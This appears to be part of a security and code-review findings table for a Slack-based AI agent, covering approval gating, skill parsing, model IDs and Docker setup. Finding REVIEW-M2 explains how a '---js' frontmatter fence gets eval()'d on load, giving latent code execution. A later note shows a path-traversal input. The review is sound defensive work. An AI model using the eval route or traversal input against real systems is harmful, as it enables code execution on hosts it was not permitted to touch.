| REVIEW-H2 | **Medium** | Ground rule "model IDs go stale" / `listAvailableModels` (A-pre) | `src/llm.ts:275` `SUGGESTED_MODELS.google` | Two advertised Google IDs are dead: `google:gemini-2.5-flash` and `google:gemini-2.5-pro` return **404 "no longer available to new users"**. A user who picks either from the advertised list (or follows `CLAUDE.md`/README examples that name `gemini-2.5-pro`) gets a hard failure mid-turn. `validateModelId` passes them because it does not contact the provider. | 4 live Google calls (table above): both 2.5 IDs REJECTED; `gemini-flash-latest`, `gemini-pro-latest`, `gemini-3.1-pro-preview` OK. | Drop `gemini-2.5-flash`/`gemini-2.5-pro` from the suggestions; keep the `*-latest` aliases and current `3.x` IDs. Re-check other providers' IDs at build time. | core |
| REVIEW-M2 | **Medium** | A21 (skill parsing) | `src/skills.ts:484` `parseSkill`; `:526` `loadAllSkills`; `:538` `getSkill` | `matter(raw, {})` has no language lock. gray-matter maps a `---js` fence to its `javascript` engine, which runs the frontmatter through `eval()`. Any file in `data/skills/<name>.md` beginning with `---js` executes arbitrary code in the agent (root) process on load. Not reachable by the sandbox user today (skills/ is root-owned 700) and the agent's own writes go through YAML `serializeSkill`, so exploitation needs a hostile file placed by the operator or a future write-path bug — but it is latent RCE from a data file. | `test/review-findings.test.ts` `REVIEW-M2` (writes a `---js` skill, `getSkill` eval's it, global side effect observed; test fails on HEAD). Confirmed in `node_modules/gray-matter/lib/engines.js:43` (`eval`). | Lock the parser to YAML: pass `{ language: 'yaml' }` and/or override `engines.javascript` to a no-op/throw in both `parseSkill` reads. | core |
| REVIEW-M3 | **Medium** | A03 / A13 (approval integrity) | `src/agent.ts:425` (supersede on new user message) | When two sibling tool calls pause in one step and the user **approves one** then sends a new message before it runs, `closeDanglingToolCalls` writes an `execution-denied` result for the still-unrun approved call. A user-approved action is silently dropped. Fails safe (it does not run), so not High, but it violates the user's expectation that an approved action executes. (Engineer-flagged risk #2.) | Code path: `listPendingApprovals` are superseded, then `closeDanglingToolCalls(history, SUPERSEDED_REASON)` denies any tool-call lacking a result, including the APPROVED-not-yet-run one. No automated repro added (multi-approval timing); logic review. | Before superseding, run any sibling already `APPROVED` in the DB (or re-arm it) instead of denying it; only deny PENDING ones. | core |
| REVIEW-L4 | **Low** | A24 | `src/tools/browser.ts:97,203` `approvedTypeTargets` | The browser_type origin-check map is in memory only. A `browser_type` approval clicked after a restart is refused ("approval context … is gone"). Fails safe but loses the action; the user must re-ask. (Engineer risk #4.) | Code review; comment at `browser.ts:95` documents it. | Persist the approved page URL with the approval row (or re-capture the current URL under the thread lock at execute time and compare to the stored preview). | core |
| REVIEW-L5 | **Low** | A01 / A13 | `src/scheduler.ts:149-156` | The scheduler builds its own `webApi.WebClient` from `SLACK_BOT_TOKEN` to update expired-approval messages, bypassing `SlackPort`. Works, but it is a second Slack client outside the A01 port boundary and re-reads the raw token. (Engineer risk #5.) | Code review. | Add `SlackPort.updateMessage(...)` and route the expiry sweep through it; drop the ad-hoc client. | integ / Lead |
| REVIEW-L6 | **Low** | A13 | `src/agent.ts:425`, `src/slack.ts:414` | A superseded approval's Slack message is never updated: its Approve/Reject buttons remain. A later click is safely rejected ("already decided or expired") but the stale buttons are confusing. (Engineer risk #1.) | Code review; `slack.ts` only updates the message on a successful `resolveApproval`, and supersede resolves via the agent path with no Slack update. | On supersede, update each affected message to a "superseded" state (needs L5's update capability). | integ |
| REVIEW-L7 | **Low** | A03 | `src/tools/bash.ts:265`, `src/tools/browser.ts:198`, `src/tools/*` | Tool-level `needsApproval` is `@deprecated` in ai@7 (`node_modules/@ai-sdk/provider-utils/dist/index.d.ts:2325`); the SDK now prefers `generateText` `toolApproval` + `experimental_toolApprovalSecret`. It still works today. (Engineer risk #7.) | `grep -n '@deprecated' node_modules/ai/...` and provider-utils types. | Plan a migration to the generateText-level approval API before an ai major bump removes it. | core |
| REVIEW-L8 | **Low** | A22 | `Dockerfile`, `package.json:235` | The runtime image runs Node **v26.13** (`docker run … node --version`) while dev and `@types/node` are v22. Type-checking and local behaviour can diverge from production (e.g. new/changed Node APIs). | `docker run --rm --entrypoint sh openagent:latest -c 'node --version'` → `v26.13.0`. | Pin the base image's Node major to the supported line, or bump `@types/node`/`engines` to match the image and test on it. | Lead / integ |
| REVIEW-L9 | **Low** | A20 | `src/db.ts:420-470` | The `followups` table is never pruned; `DONE`/`FAILED`/`CANCELLED` rows accumulate forever. Low impact (one row per follow-up) but unbounded. | Schema review — no delete/retention path. | Periodically delete terminal follow-ups older than N days, or VACUUM on boot. | Lead |

### Notes (reviewed, not findings)

- **Engineer risk #3 (partial persist on provider error after an approved tool ran):** acceptable. Persisting only the real tool result (never a half-written assistant turn) is the right trade-off vs. reporting an executed action as "never run". `persistApprovedRuns` guards against persisting a denial-only message.
- **Engineer risk #6 (each top-level DM is its own thread):** by design — the A01 thread key is `thread_ts ?? ts`. No data loss; conversations just don't merge across DM roots.
- **Prototype pollution in frontmatter:** not reproducible — js-yaml 3.15 treats `__proto__` as an own key; `({}).polluted` stayed `undefined` in a direct probe. (The `---js` eval path is the real risk; see REVIEW-M2.)
- **Path traversal in skill names:** blocked. `SKILL_NAME_RE = /^[a-z0-9][a-z0-9-]{0,63}$/` + `assertSkillName` in `skillPath`; `../../x` is rejected before any filesystem access.
- **Model output → git args / shell:** safe. `git()` uses `execa` with an argv array (no shell); commit messages and skill names are arguments, not interpolated into a command line. Bash runs model commands only behind the A08 approval gate.
- **Secrets in logs / Slack / `messages_json`:** `safeErrorLine` (slack) and `errLine` (scheduler) redact token-like and long strings; the bash child env is scrubbed (A10), so command output cannot echo keys. `maskSecret` in doctor shows only a prefix. No secret-leak path found.
- **Crash resilience:** `handleTurn` is wrapped in try/catch; Bolt has `app.error`; `index.ts` logs `unhandledRejection` and exits on `uncaughtException`. A provider/Chromium/Slack outage surfaces as a thread error line and releases the thread lock (the lock's `finally`).

---

## Files changed by this review

- `docs/REVIEW.md` (this file)
- `test/review-findings.test.ts`: H1/H2/M2 regressions (pass), plus C10 and H11 evidence (the 2 intended failures). Rewritten in the verify pass; the audit-pass H1 assertions were replaced to match A25.
- `test/review-m3.test.ts`: M3 regression (passes)
- `test/review-gating.test.ts` (round 2): end-to-end gating through `toolApproval` (A03/A08/A11/A24/A25/A26)
- `test/review-slack.test.ts` (round 2): A26 Slack rendering regressions, plus the REVIEW-M13 `it.fails` evidence
- `test/review-slack.test.ts` (round 3): M13 evidence converted to a regression; 36 new A26 "faithful previews" regressions; `it.fails` evidence for REVIEW-M14, M15, L16 and L17
- `test/review-slack.test.ts` (round 4): M14 and L16 evidence converted to regressions (6 + 2 tests); the Default_Ignorable scan has no exemptions; `WHOLE_UNITS` accepts a lone `⟩` (plain text under the new spec); M15 and L17 stay `it.fails`
- `test/review-source-hygiene.test.ts` (round 4): `src/` invisible-character guard; skills.ts BOM handling via the public API
- `test/agent.test.ts` (round 2): line 131 assertion updated from "truncated to ~500 chars" to "complete command" per A26
- `test/review-findings.test.ts` (round 2): C10/H11 evidence converted to regressions; L12 regressions added
- `test/live.providers.test.ts`: budgeted live probes, gated by `LIVE_LLM=1`; skipped by default

No `src/`, config, Docker or other docs files were modified.
